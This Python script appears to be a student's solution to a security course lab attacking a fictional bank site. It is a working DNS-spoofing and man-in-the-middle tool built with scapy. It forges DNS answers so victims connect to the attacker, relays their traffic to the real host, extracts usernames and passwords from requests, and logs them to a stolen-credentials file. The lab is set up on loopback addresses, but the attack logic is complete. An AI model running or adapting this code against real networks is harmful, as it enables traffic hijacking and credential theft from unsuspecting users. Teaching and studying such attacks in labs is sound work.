import os
import argparse
import socket
from scapy.all import *

conf.L3socket = L3RawSocket
WEB_PORT = 8000
HOSTNAME = "LetumiBank.com"

#based mostly on chatGpt and https://www.cs.dartmouth.edu/~sergey/netreads/local/reliable-dns-spoofing-with-python-scapy-nfqueue.html

def resolve_hostname(hostname):
	# IP address of HOSTNAME. Used to forward tcp connection.
	# Normally obtained via DNS lookup.
	return "127.1.1.1"


def log_credentials(username, password):
	# Write stolen credentials out to file.
	# Do not change this.
	with open("lib/StolenCreds.txt", "wb") as fd:
		fd.write(str.encode("Stolen credentials: username=" + username + " password=" + password))


def check_credentials(client_data):
	# TODO: Take a block of client data and search for username/password credentials.
	# If found, log the credentials to the system by calling log_credentials().
	
	if ("username" in str(client_data)) and ("password" in str(client_data)):
		data_array = (str(client_data)).split("'")
		for i in range(len(data_array)):
			if "username" in data_array[i]:
				username="'"+data_array[i+1]+"'"
			if "password" in data_array[i]:
				password="'"+data_array[i+1]+"'"
		log_credentials(username, password)
			


def handle_tcp_forwarding(client_socket, client_ip, hostname):
	# Continuously intercept new connections from the client
	# and initiate a connection with the host in order to forward data

	while True:

		# TODO: accept a new connection from the client on client_socket and
		# create a new socket to connect to the actual host associated with hostname.
		
		victim_sock, addr = client_socket.accept()
		
		host_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		host_sock.connect((resolve_hostname(hostname), WEB_PORT))

		# TODO: read data from client socket, check for credentials, and forward along to host socket.
		# Check for POST to '/post_logout' and exit after that request has completed.
		client_data = victim_sock.recv(50000)
		check_credentials(client_data)
		host_sock.send(client_data)
		reponse = host_sock.recv(50000)
		victim_sock.send(reponse)
		host_sock.close()
		if "POST" in str(client_data) and "/post_logout" in str(client_data):
			client_socket.close()
			exit(0)
			
			
	
	



def dns_callback(packet, extra_args):
	# TODO: Write callback function for handling DNS packets.
	# Sends a spoofed DNS response for a query to HOSTNAME and calls handle_tcp_forwarding() after successful spoof.
	sock, source_ip = extra_args
	if packet.haslayer(DNS):
		if HOSTNAME in str(packet[DNSQR].qname): 	
			response = IP(dst=packet[IP].src, src=packet[IP].dst) / UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) /DNS(id=packet[DNS].id,aa=1,qr=1,qd=packet[DNS].qd,an=DNSRR(rrname=HOSTNAME, rdata=source_ip))	
			send(response)
			handle_tcp_forwarding(sock, packet[IP].src, HOSTNAME)
	
	


def sniff_and_spoof(source_ip):

	# TODO: Open a socket and bind it to the attacker's IP and WEB_PORT.
	# This socket will be used to accept connections from victimized clients.
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.bind((source_ip, WEB_PORT))
	sock.listen()
	# TODO: sniff for DNS packets on the network. Make sure to pass source_ip
	# and the socket you created as extra callback arguments.
	extra_args = (sock , source_ip)
	cb = lambda packet: dns_callback(packet,extra_args)
	 #port 53 is DNS
	sniff(iface="lo",filter="port 53",store = 0, prn=cb) 
	return
	


def main():
	parser = argparse.ArgumentParser(description='Attacker who spoofs dns packet and hijacks connection')
	parser.add_argument('--source_ip', nargs='?', const=1, default="127.0.0.3", help='ip of the attacker')
	args = parser.parse_args()

	sniff_and_spoof(args.source_ip)


if __name__ == "__main__":
	# Change working directory to script's dir.
	# Do not change this.
	abspath = os.path.abspath(__file__)
	dirname = os.path.dirname(abspath)
	os.chdir(dirname)
	main()
